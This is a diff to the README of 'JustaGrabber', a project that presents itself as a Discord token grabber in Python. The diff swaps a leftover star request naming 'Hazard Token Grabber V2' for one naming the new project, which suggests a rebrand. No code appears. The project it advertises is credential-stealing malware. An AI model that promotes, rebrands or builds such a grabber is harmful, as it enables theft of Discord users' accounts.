@@ -1,7 +1,7 @@
 <h1 align="center">🎄 JustaGrabber - A discord token grabber written in python3<h1>
 <h3 align="center">🎇 Made by kldiscord https://github.com/kldiscord<h3>
 
-## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Star This Repository If You Liked Hazard Token Grabber V2!
+<h3 align="center">🌟 Please leave a star if you liked JustaGrabber<h3>
 
 ---
 
